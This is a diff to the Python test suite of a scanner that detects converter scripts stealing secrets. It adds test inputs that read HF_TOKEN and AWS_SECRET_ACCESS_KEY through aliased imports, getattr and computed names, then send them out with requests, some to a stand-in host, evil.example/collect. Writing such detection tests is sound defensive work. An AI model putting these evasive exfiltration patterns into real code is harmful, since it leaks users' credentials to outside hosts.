@@ -3439,6 +3439,25 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         + 'read_secret = os.getenv\n'
         + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
         + ' "b": read_secret("AWS_SECRET_ACCESS_KEY")})\n',
+        # The module can be renamed too, and then the receiver says nothing
+        # about what the .getenv on it reads.
+        'import os\nimport os as o\nimport requests\n' + hub
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": o.getenv("AWS_SECRET_ACCESS_KEY")})\n',
+        # getattr holds neither an Attribute nor a Name spelled post.
+        'import os\nimport requests\n' + hub
+        + 'f = getattr(requests, "post")\n'
+        + 'requests.get(HUB)\n'
+        + 'f("https://huggingface.co/api/repos/create",'
+        + ' data = os.environ["HF_TOKEN"])\n',
+        # And a computed name on one of these modules is a lookup this cannot
+        # read at all. Upstream calls getattr with a computed name nine times,
+        # every one of them on its own objects, so those stay readable.
+        'import os\nimport requests\n' + hub
+        + 'name = "environ"\n'
+        + 'env = getattr(os, name)\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"],'
+        + ' "b": env["AWS_SECRET_ACCESS_KEY"]})\n',
     ):
         assert any(
             "Harvests environment variables" in f.check
@@ -3459,6 +3478,15 @@ def test_a_write_or_an_environment_read_under_another_name_refuses_it():
         'import os\nimport requests\n' + hub
         + 'if os.getenv("HF_TOKEN"):\n'
         + '    requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
+    ) == []
+    # getattr with a computed name on the file's OWN objects is upstream's
+    # shape and must stay readable.
+    assert scan_converter_source(
+        'import os\nimport requests\n' + hub
+        + 'class Reader:\n'
+        + '    def read(self, name):\n'
+        + '        return getattr(self, name)\n'
+        + 'requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     ) == []
 
 
@@ -3495,6 +3523,17 @@ def test_an_oversized_join_is_not_folded():
             'requests.get(X, headers = {"a": token})\n'
         )
     ], "an oversized join must not hide the literals inside it"
+
+    # str.format has the same ceiling and needs it for a different reason: one
+    # argument referenced by thousands of {0} fields expands far past the input
+    # cap, 110 KB of source taking 14.8 seconds before this.
+    started = time.perf_counter()
+    module.scan_converter_source(
+        preamble
+        + 'X = "' + "{0}" * 20_000 + '".format("' + "B" * 50_000 + '")\n'
+        'requests.get(HUB, headers = {"a": token})\n'
+    )
+    assert time.perf_counter() - started < 5
 
     # A join small enough to fold is still folded.
     assert [
@@ -3558,7 +3597,18 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
         '    return requests.get(HUB, headers = {"a": os.environ["HF_TOKEN"]})\n'
     ) == []
 
-    # A docstring the file can READ is a value like any other.
+    # The word in a comment is not a read. Taking it for one put the false
+    # positive straight back, on a file whose only sin was mentioning __doc__.
+    assert scan_converter_source(
+        '"""See https://github.com/ggml-org/llama.cpp for details."""\n'
+        'import os\n'
+        'import requests  # __doc__ is the module docstring\n'
+        'HUB = "https://huggingface.co"\n'
+        'requests.get(HUB, headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    ) == []
+
+    # A docstring the file can READ is a value like any other, whether it is
+    # reached as an attribute or as the bare module-level name.
     assert [
         f.check for f in scan_converter_source(
             'import os\n'
@@ -3567,6 +3617,15 @@ def test_a_documentation_url_in_a_docstring_is_not_a_destination():
             'def fetch():\n'
             '    """https://evil.example/collect"""\n'
             'requests.get(fetch.__doc__ + os.environ["HF_TOKEN"])\n'
+        )
+    ]
+    assert [
+        f.check for f in scan_converter_source(
+            '"""https://evil.example/collect"""\n'
+            'import os\n'
+            'import requests\n'
+            'HUB = "https://huggingface.co"\n'
+            'requests.get(__doc__ + os.environ["HF_TOKEN"])\n'
         )
     ]
     # And a bare string statement is not a docstring.
@@ -3826,6 +3885,9 @@ def test_the_hub_allowance_reads_the_real_hostname():
     # of anything. The receiver of the reshape is the join itself, with no name
     # in between to have been tainted.
     assert _reshaped('url = "".join([BASE, "/x"]).replace("huggingface.co", "evil.example")\n')
+    # += mutates the carrier in place and the walk still sees only the hub it
+    # started as, while at runtime the authority resolves to evil.example.
+    assert _reshaped('url = BASE\nurl += "@evil.example/collect"\n')
     assert _reshaped('url = f"{BASE}"[:8] + "evil.example"\n')
     # Joining the hub with its own path is still the hub.
     assert _beside_the_hub('"/".join(("https://huggingface.co", "api", "models"))') == []
